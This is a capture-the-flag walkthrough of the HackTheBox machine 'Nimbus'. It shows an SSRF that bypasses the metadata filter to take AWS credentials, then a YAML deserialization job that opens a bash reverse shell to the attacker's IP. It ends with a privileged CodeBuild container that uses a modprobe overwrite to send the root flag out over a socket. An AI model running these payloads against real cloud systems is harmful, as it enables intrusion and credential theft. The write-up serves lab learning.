+++
title = "Nimbus - Chaining vulnerabilities in AWS infrastructure"
date = 2026-07-07T09:31:48Z
difficulty = "hard"
tags = ["HTB - Hard", "Linux", "Pentesting"]
description = "Pwning the Nimbus machine from HTB."
+++
## **OVERVIEW**
*Nimbus* is a hard-rated Linux machine on the HackTheBox platform. Rooting the machine requires SSRF to extract AWS credentials from an online YAML uploader, container enumeration to reveal root privileges on a LocalStack emulator, and privilege escalation through a Bash function injection within the container's build specifications- opening up the door to compromising the host via kernel exploit.
## **RECON**
After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nmap -sC -sV 10.129.32.62 -oN nmap_scan.txt --min-rate=10000
```
The scan revealed two open ports for SSH and HTTP:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-07 09:29 PDT
Nmap scan report for 10.129.32.62
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.02 seconds
```
Port 80 resolved to a domain, **nimbus.htb**, which I added to my **/etc/hosts** file. Visiting this address in my web browser brought me to this page:
![nimbus home page](/images/nimbus/home.png)
## **ENUMERATION**
I went ahead and ran a **gobuster** and **ffuf** scan to reveal any endpoints or subdomains while I manually enumerated the site. The only thing I was able to gather from the scan was a *subdomain* for **aws.nimbus.htb**. I added the domain to my **/etc/hosts** file and carried on.    
&nbsp;  
The website seemed to be hosting a **job scheduler** service for a team, where they can submit tasks to run at their date/time of choice. The job submitter looked like this:
![job submitter](/images/nimbus/submitter.png)
The site gave you the choice to either specify a URL that *points* to a YAML file containing the job you want to run, or manually type in a YAML job that you want to run. Right away, I tried uploading a reverse shell script into the custom YAML uploader, but that attempt would be **shut down** since the site doesn't run code upon upload.  
&nbsp;  
*However*, the URL uploading feature would turn out to be a gold mine... Although it explicity states **"Internal addresses and metadata endpoints are blocked"** that would turn out to be all fluff. Lemme break down the attack:  
&nbsp;  
    **1)** AWS EC2 instances like these are equipped with **temporary creds** for each role/service, which are hosted from a URL serving metadata for other roles to grab and utilize.  
    &nbsp;  
    **2)** This means that if we hit that **metadata endpoint** internally, we'd be able to see credentials for whatever role is *submitting jobs*.  
    &nbsp;  
    **3)** The IP used for hosting this metadata is **169.254.169.254**. So, if we find a way to get to that endpoint, we'd be able to harvest the **temporary credentials** for the job submitter and from *there*, submit a malicious job directly to the next role (the one responsible for *running* the job)  
    &nbsp;  
Trying to access this metadata endpoint with the original IP, **http://169.254.169.254/?x=.yaml** (malformed URL to bypass the YAML restriction), leaves us with this:  
![metadata error](/images/nimbus/blocked.png)
But, if we use the **decimal encoding** version of the metadata endpoint's IP to form **http://2852039166/?x=.yaml**, we get greeted with this:  
![success](/images/nimbus/success.png)
**We're in!** By traversing through the metadata directories via **SSRF**, I was able to successfully find **temporary credentials** at **http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml**:  
![temp creds](/images/nimbus/tempcreds.png)
I went ahead and grabbed this information and configured my attacker's AWS credentials:  
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# aws  configure
AWS Access Key ID [None]: ASIAQX4PG7L2K9M3N5R8
AWS Secret Access Key [None]: bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
AWS Session Token [None]: IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM
Default region name [None]: us-east-1
Default output format [None]:
```
Running **aws sts get-caller-identity** let's us see whose credentials we harvested, and sure enough, they're for the **nimbus-web-role**:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# aws sts get-caller-identity --endpoint-url http://aws.nimbus.htb
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```
To find out what URL's to submit YAML jobs to, I ran the following command:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# aws sqs list-queues --endpoint-url http://aws.nimbus.htb        
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```
Now that we got a **queue URL** and **temporary credentials**, it's time to establish a-
## **FOOTHOLD**
I crafted the following job in order to pop a reverse shell as whoever receives it:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# aws sqs send-message \
--queue-url http://floci:4566/847219365028/nimbus-jobs \
--message-body '!!python/object/apply:subprocess.Popen
args:
  - ["bash", "-c", "bash -i >& /dev/tcp/10.10.16.217/4444 0>&1"]' \
--endpoint-url http://aws.nimbus.htb
{
    "MD5OfMessageBody": "86185bb00679ef79fa6997efffc063d3",
    "MessageId": "293ea246-4c8f-43a8-9f37-564a4b3b8994"
}
```
Checking my listener:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.217] from (UNKNOWN) [10.129.32.62] 44822
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
worker@24d291e48708:/app$ whoami
whoami
worker
worker@24d291e48708:/app$
```
**Success**. I went ahead and cleaned up the shell to get an interactive TTY (here's the sauce):
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.217] from (UNKNOWN) [10.129.32.62] 44822
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
worker@24d291e48708:/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
worker@24d291e48708:/app$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                             
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               reset

worker@24d291e48708:/app$ export TERM=xterm-256color
worker@24d291e48708:/app$ export SHELL=/bin/bash
worker@24d291e48708:/app$ stty rows 25 columns 77
worker@24d291e48708:/app$ 
```
Grabbed the **user.txt** flag from **/home/worker**:
```bash
worker@24d291e48708:/app$ cd /home/worker
worker@24d291e48708:~$ ls
user.txt
worker@24d291e48708:~$ cat user.txt
ac320b2d87a3c027b2c81a69be23d8a4
```
Then, I moved on to figuring out how to privesc through manual enumeration. It didn't take much time to figure out that the **worker** user I was running on was in an *almost completely* secured container- no access to run anything besides a single *worker* script, located in the **/app** directory, used to parse YAML jobs and run them.  
&nbsp;  
However, the **worker** user utilized a different set of AWS credentials, shown in its **environment variables**:  
```bash
worker@24d291e48708:/app$ env
SHELL=/bin/bash
PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
HOSTNAME=24d291e48708
PYTHON_VERSION=3.11.15
AWS_DEFAULT_REGION=us-east-1
PWD=/app
HOME=/home/worker
LANG=C.UTF-8
LS_COLORS=
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
TERM=xterm-256color
SHLVL=3
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_ENDPOINT_URL=http://aws.nimbus.htb
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
worker@24d291e48708:/app$ aws sts get-caller-identity
{
    "UserId": "AROA7P3R9X4K8M2L5VHNT:worker",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-worker-role/worker"
}
``` 
Using these creds, I tried to enumerate AWS S3 buckets on the **http://aws.nimbus.htb** endpoint, but was denied access. The **worker** role didn't have any access to the main endpoint, so I tried to pivot.  
&nbsp;  
I wasn't able to list connections using netstat in the terminal since the container that **worker** ran from was *very limited*, so I utilized this script to find TCP connections within the machine:
```bash
worker@24d291e48708:~$ cat > awk_netstat.sh << "EOF"
> #!/bin/bash
>
> awk 'function hextodec(str,ret,n,i,k,c){
>     ret = 0
>     n = length(str)
>     for (i = 1; i <= n; i++) {
>         c = tolower(substr(str, i, 1))
>         k = index("123456789abcdef", c)
>         ret = ret * 16 + k
>     }
>     return ret
> }
> function getIP(str,ret){
>     ret=hextodec(substr(str,index(str,":")-2,2)); 
>     for (i=5; i>0; i-=2) {
>         ret = ret"."hextodec(substr(str,i,2))
>     }
>     ret = ret":"hextodec(substr(str,index(str,":")+1,4))
>     return ret
> } 
> NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp
> EOF
worker@24d291e48708:~$ chmod +x awk_netstat.sh && ./awk_netstat.sh
Local - Remote
127.0.0.11:39921 - 0.0.0.0:0
172.18.0.3:48118 - 172.18.0.1:80
172.18.0.3:44822 - 10.10.16.217:4444
worker@24d291e48708:~$ 
```
Other than the connection to my attacker machine, the **worker** user was running from a container on private IP **172.18.0.3**, connected to the host machine, **172.18.0.1**. Since I knew that **worker** didn't have access to the AWS buckets on the host, I tried to connect to **172.18.0.2** to see if it was running any AWS instance that I had access to:  
```bash
worker@24d291e48708:~$ aws sts get-caller-identity --endpoint-url http://172.18.0.2:4566/
{
    "UserId": "847219365028",
    "Account": "847219365028",
    "Arn": "arn:aws:iam::847219365028:root"
}
```
*This* is what opened up the door to privesc. The **worker** user had **root** level privileges on **LocalStack**, which runs on port 4566. **LocalStack** is essentially a mock AWS environment used for development purposes, allowing for cloud emulation on a single device. Since the **worker** user authenticated as **root**, I had the ability to create a **privileged container** to run arbitrary commands on the **host machine**.  
&nbsp;  
This is where **CodeBuild** comes in. **CodeBuild** is an AWS utility that lets you create containerized build environments to test code. If you create a CodeBuild environment with **privilegedMode=true**, you give the container **CAP_SYS_ADMIN** capabilities and effectively have the ability to write to the host's **/proc/sys/kernel**, opening the door for a **kernel exploit**.  
&nbsp;  
In order to get that to work, we needed to create a malicious **buildspec.yml** file and **project JSON** to create the container and run our arbitrary code. The **floci/floci:latest** CodeBuild image by default drops the container's privileges back down to the **user's** privileges *after* initialization. However, if we inject a custom **Bash function** to run right after the container builds, we can finesse it into keeping our **root** privileges.  
&nbsp;  
Now, with all that out the way, let's-
## **PRIVESC**  
The privilege escalation process was carried out through the following steps:  
&nbsp;  
**1)** Create a **buildspec.yml** file to specify the commands we want our privileged container to run: (the following YAML finds the **upperdir**, the host's path where the container's filesystem lives, then injects a payload into the host's temp directory which overrides the **modprobe** binary, which gets triggered by the **xff magic bytes**):  
```bash
worker@24d291e48708:~$ cat > buildspec.yml << 'EOF'
version: 0.2
phases:
  build:
    commands:
      - id
      - cat /proc/self/status | grep Cap
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c 'import socket; s = socket.socket(); s.connect(("10.10.16.217", 8888)); s.send(open("/root/root.txt","rb").read()); s.close()'
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\xff\xff\xff\xff' > /tmp/pwn && chmod +x /tmp/pwn && /tmp/pwn; true
EOF
```
**2)** Craft a **project JSON** file to compile the CodeBuild container, injecting a malicious **BASH_FUNC_id%%** environment variable to run when the **id** command is called from our buildspec.yml file:
```bash
worker@24d291e48708:~$ python3 << "EOF" > project.json
import json

project = {
  "name":"gimme-those",
  "source":{"type":"NO_SOURCE", "buildspec":open("buildspec.yml").read()},
  "artifacts":{"type":"NO_ARTIFACTS"},
  "environment":{
    "type":"LINUX_CONTAINER",
    "image":"floci/floci:latest",
    "computeType":"BUILD_GENERAL1_SMALL",
    "privilegedMode":True,
    "environmentVariables": [
      {
        "name":"BASH_FUNC_id%%",
        "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
        "type":"PLAINTEXT"
      }
    ]
  },
  "serviceRole": "arn:aws:iam::000000000000:role/pwned"
}
print(json.dumps(project))
EOF
```
**3)** Set up listener on our attacking machine:
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nc -lvnp 8888
listening on [any] 8888 ...
```
**4)** Create and start the build and catch a flag:
```bash
worker@24d291e48708:~$ aws codebuild create-project --cli-input-json file://project.json --endpoint-url http://172.18.0.2:4566
```
```bash
worker@24d291e48708:~$ aws codebuild start-build --project-name gimme-those --endpoint-url http://172.18.0.2:4566
```
```bash
┌──(root㉿pangelinan)-[~/HackTheBox]
└─# nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.16.217] from (UNKNOWN) [10.129.32.62] 39198
240f67baa03543d84ef4bc7d489ade2b
```
What a journey.
## **TAKEAWAYS**
Hacking into this was something else. I was able to do a lot of hands-on learning with AWS cloud infrastructure, seeing how the **nimbus-web-role** and **nimbus-worker-role** worked together. If I'm being honest, I knew little about AWS and cloud emulators like LocalStack and I probably spent more time trying to learn how these systems work instead of enumerating.  
&nbsp;  
All-in-all, a great learning experience and practice lab for sharpening my pentesting skills. I got to link together SSRF, token harvesting, and privileged containers to create a kernel exploit- a full vulnerability chain for complete system compromise. Definitely one for the books.